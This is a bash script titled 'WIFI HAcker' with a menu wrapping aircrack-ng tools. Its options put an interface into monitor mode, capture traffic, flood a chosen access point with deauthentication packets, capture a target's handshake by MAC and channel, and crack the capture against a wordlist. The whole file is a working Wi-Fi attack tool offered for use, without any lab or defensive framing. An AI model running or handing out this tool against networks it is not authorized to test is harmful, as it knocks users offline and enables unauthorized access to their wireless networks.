#!/bin/bash
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi


monitor_mode(){
    clear
figlet WIFI HAcker
echo "Please Enter the Interface Name "
read intname
sudo airmon-ng check kill
sudo airmon-ng start $intname
sleep 4
main
}

pcap(){
    
    clear
    sleep 5
    figlet WIFI HAcker
    echo "Enter the interface name"
    read intname
    trap "press CTRL + C when Done" INT
    airodump-ng $intname
    main

}

crack(){
clear 
Green=$'\e[1;32m'
echo $Green
figlet WIFI HAcker
echo "Enter the location of the file to crack"
read loc
echo "Enter the location of the wordlist"
read wloc
trap "press CTRL + C at anytime when you want ot exit" INT
sudo aircrack-ng $loc -w $wloc
main
}

Deauth(){
    clear
    sleep 5
    figlet WIFI HAcker
    trap "press CTRL + C when Done" INT
    airodump-ng $intname
    trap "press CTRL + C when Done" INT
    echo "Enter the MAC of the Target"
    read mac
    echo "How many packets you want to send"
    read pac 
    sudo aireplay-ng --deauth $pac  -a $mac wlan0
    main
}

Capture(){
clear
figlet WIFI HAcker
echo "Enter the MAC address of the Target"
read mac
echo "Enter the Channel of the target"
read ch
echo "Enter the interface name"
read intname
echo "the captured file will be saved in current location as cpcrack"
trap "press CTRL + C when Done" INT
sleep 4
sudo airodump-ng -w cpcrack -d $mac -c $ch $intname
main
}




main(){
    clear
Green=$'\e[1;32m'
echo $Green
figlet WIFI HAcker
echo "Enter the your options"
echo "1.Enable Monitor Mode"
echo "2.Packet capture"
echo "3.Deauth Attack"
echo "4.Target Packet Capture Attack"
echo "5.Crack the captured file"
echo "6.Exit"
read opt
case $opt in 

1)
monitor_mode
;;

2)
pcap
;;

3)
Deauth
;;

4)
Capture
;;

5)
crack
;;

6)
exit
;;

esac
}

main
